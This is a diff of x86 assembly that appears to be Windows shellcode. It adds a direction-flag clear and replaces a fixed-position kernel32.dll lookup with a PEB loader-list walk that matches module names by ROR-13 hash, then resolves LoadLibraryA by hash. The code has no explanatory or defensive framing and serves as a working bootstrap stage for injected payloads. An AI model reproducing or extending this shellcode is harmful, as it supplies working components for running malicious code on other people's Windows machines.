@@ -6,7 +6,7 @@
 
 global _start
 _start:
-
+		cld
     call LKernel32Base
 
 LGetProcAddress:
@@ -62,16 +62,31 @@ LDone:
 	ret 8
 
 LKernel32Base:
-    pop esi
-    push byte 0x30
-    pop ecx
-    mov ebx, [fs:ecx]
-    mov ebx, [ebx + 0x0c] 
-    mov ebx, [ebx + 0x14] 
-    mov ebx, [ebx]		  
-    mov ebx, [ebx]		  
-    mov ebx, [ebx + 0x10]
-
+	xor edx, edx
+	mov edx, [fs:edx+0x30] ; get a pointer to the PEB
+	mov edx, [edx+0x0C]    ; get PEB->Ldr
+	mov edx, [edx+0x14]    ; get PEB->Ldr.InMemoryOrderModuleList.Flink
+next_mod:
+	mov esi, [edx+0x28]    ; get pointer to modules name (unicode string)
+	push byte 24           ; push down the length we want to check
+	pop ecx                ; set ecx to this length for the loop
+	xor edi, edi           ; clear edi which will store the hash of the module name
+loop_modname:
+	xor eax, eax           ; clear eax
+	lodsb                  ; read in the next byte of the name
+	cmp al, 'a'            ; some versions of Windows use lower case module names
+	jl not_lowercase       ; 
+	sub al, 0x20           ; if so normalise to uppercase
+not_lowercase:           ; 
+	ror edi, 13            ; rotate left our hash value
+	add edi, eax           ; add the next byte of the name
+	loop loop_modname      ; loop untill we have read enough
+	cmp edi, 0x6A4ABC5B    ; compare the hash with that of kernel32.dll
+	mov ebx, [edx+0x10]    ; get this modules base address
+	mov edx, [edx]         ; get the next module
+	jne next_mod           ; if it doesnt match, process the next module
+	pop esi
+	
     push ebx                ; kernel32.dll base
     push 0xec0e4e8e         ; LoadLibraryA
     call esi                ; GetProcAddress(kerne32.dll, LoadLibrary)
